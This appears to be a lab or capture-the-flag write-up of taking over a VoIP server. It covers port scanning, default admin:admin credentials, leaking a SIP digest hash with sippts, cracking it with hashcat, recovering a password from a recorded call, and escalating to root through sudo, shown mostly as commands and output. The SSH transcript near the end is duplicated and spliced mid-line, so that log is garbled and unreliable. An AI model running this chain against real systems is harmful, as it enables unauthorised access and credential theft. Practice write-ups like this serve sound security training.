```
nmap -sC -sV -p- 192.168.203.156
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 22:50 CDT
Nmap scan report for 192.168.203.156
Host is up (0.056s latency).
Not shown: 65485 closed tcp ports (conn-refused), 47 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: VOIP Manager
|_Requested resource was login.php
8000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 227.99 seconds
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU 192.168.203.156
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 22:56 CDT
Nmap scan report for 192.168.203.156
Host is up (0.054s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT     STATE         SERVICE
5060/udp open|filtered sip

Nmap done: 1 IP address (1 host up) scanned in 1043.17 seconds
```

Found I was able to login on port 8000 with admin:admin and I found a list of users.

I then found the tool below.

https://github.com/Pepelux/sippts

```
python3 sipdigestleak.py -i 192.168.203.156                                  

☎  SIPPTS BY 🅿 🅴 🅿 🅴 🅻 🆄 🆇
                                                                                                                    
█████████████████████████████████▀█████████████████████████████████████████████                                     
█─▄▄▄▄█▄─▄█▄─▄▄─███▄─▄▄▀█▄─▄█─▄▄▄▄█▄─▄▄─█─▄▄▄▄█─▄─▄─███▄─▄███▄─▄▄─██▀▄─██▄─█─▄█                                     
█▄▄▄▄─██─███─▄▄▄████─██─██─██─██▄─██─▄█▀█▄▄▄▄─███─██████─██▀██─▄█▀██─▀─███─▄▀██                                     
▀▄▄▄▄▄▀▄▄▄▀▄▄▄▀▀▀▀▀▄▄▄▄▀▀▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▀▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀                                     
                                                                                                                    
💾 https://github.com/Pepelux/sippts                                                                                
🐦 https://twitter.com/pepeluxx                                                                                     
                                                                                                                    
                                                                                                                    
Press Ctrl+C to stop                                                                                                
                                                                                                                    
                                                                                                                    
[✓] Target: 192.168.203.156:5060/UDP                                                                                
                                                                                                                    
[=>] Request INVITE                                                                                                 
[<=] Response 180 Ringing                                                                                           
[<=] Response 200 OK                                                                                                
[=>] Request ACK                                                                                                    
        ... waiting for BYE ...                                                                                     
[<=] Received BYE                                                                                                   
[=>] Request 407 Proxy Authentication Required                                                                      
[<=] Received BYE                                                                                                   
[=>] Request 200 Ok                                                                                                 
Auth=Digest username="adm_sip", uri="sip:127.0.0.1:5060", password="074b62fb6c21b84e6b5846e6bb001f67", algorithm=MD5
                                                                                                                    
 --------------------------------------------------------------------------------------------------------------------------------------------------                                                                                     
| IP address      | Port | Proto | Response                                                                                                        |                                                                                    
 --------------------------------------------------------------------------------------------------------------------------------------------------                                                                                     
| 192.168.203.156 | 5060 | UDP   | Digest username="adm_sip", uri="sip:127.0.0.1:5060", password="074b62fb6c21b84e6b5846e6bb001f67", algorithm=MD5 |                                                                                    
 --------------------------------------------------------------------------------------------------------------------------------------------------     
```

This tool found me the username and password in MD5.


```
hashcat -m 0 074b62fb6c21b84e6b5846e6bb001f67 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 5 2600 Six-Core Processor, 6939/13942 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

074b62fb6c21b84e6b5846e6bb001f67:passion                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 074b62fb6c21b84e6b5846e6bb001f67
Time.Started.....: Thu Jul 27 23:34:12 2023 (0 secs)
Time.Estimated...: Thu Jul 27 23:34:12 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2216.6 kH/s (0.51ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> oooooo
Hardware.Mon.#1..: Util: 22%

Started: Thu Jul 27 23:33:55 2023
Stopped: Thu Jul 27 23:34:15 2023
```

I cracked the password and logged in on port 80.

```
|   |
|---|
|##### Stream Rates|
|# Input #0, wav, from 'Call-id':  <br>Duration: 00:00:00:00, bitrate: 128 kb/s  <br>  <br>Stream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 8000 Hz, mono, s16, 128 kb/s  <br>  <br>Stream mapping:  <br>Stream #0:0 -> #0:0 (pcm_s16le (native) -> pcm_mulaw (native))  <br>  <br>Output #0, rtp, to 'raw': PT=ITU-T G.711 PCMU  <br>  <br>  <br>Metadata:  <br>encoder : Lavf58.29.100  <br>Stream #0:0: Audio: pcm_mulaw, 8000 Hz, mono, s16, 64 kb/s  <br>  <br>Metadata:  <br>encoder : Lavc58.54.100 pcm_mulaw  <br>size= --kB time=00:00:00:00 bitrate=64.8kbits/s speed= 1x|
```

I found the above and a recorded call I can change it to wav format to listen. I found the tool sox and used the above information.

```
sox -t raw -r 8000 -v 4 -c1 -e mu-law 2138.raw out.wav
sox -t <input> -r <Hz> -v 4 -c1 -e <streamtype> <input> <output>
```

I then heard that a password had been reset to Password1234. I then started attempting logins from the list.

```
ssh voiper@192.168.203.156
voiper@192.168.203.156's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 28 Jul 2023 04:48:30 AM UTC

  System load:  0.0               Processes:               212
  Usage of /:   56.2% of 9.78GB   Users logged in:         0
  Memory usage: 40%               IPv4 addrssh voiper@192.168.203.156
voiper@192.168.203.156's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 28 Jul 2023 04:48:30 AM UTC

  System load:  0.0               Processes:               212
  Usage of /:   56.2% of 9.78GB   Users logged in:         0
  Memory usage: 40%               IPv4 address for ens160: 192.168.203.156
  Swap usage:   0%


5 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

$ whoami
voiper
$ ls
local.txt
$ cat local.txt
99c53639b289ab2b6c44bedf3e918c35
$ groups
voiper
$ sudo -l
[sudo] password for voiper: 
Matching Defaults entries for voiper on VOIP:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User voiper may run the following commands on VOIP:
    (ALL : ALL) ALL
$ sudo -l
Matching Defaults entries for voiper on VOIP:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User voiper may run the following commands on VOIP:
    (ALL : ALL) ALL
$ sudo -s
# whoami
root
# cd /root
# ls
proof.txt  snap
# cat proof.txt
fe4f40c840b7760cddebb4f37a47f24aess for ens160: 192.168.203.156
  Swap usage:   0%


5 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

$ whoami
voiper
$ ls
local.txt
$ cat local.txt
99c53639b289ab2b6c44bedf3e918c35
$ groups
voiper
$ sudo -l
[sudo] password for voiper: 
Matching Defaults entries for voiper on VOIP:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User voiper may run the following commands on VOIP:
    (ALL : ALL) ALL
$ sudo -l
Matching Defaults entries for voiper on VOIP:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User voiper may run the following commands on VOIP:
    (ALL : ALL) ALL
$ sudo -s
# whoami
root
# cd /root
# ls
proof.txt  snap
# cat proof.txt
fe4f40c840b7760cddebb4f37a47f24a
```

User was able to sudo and get both flags.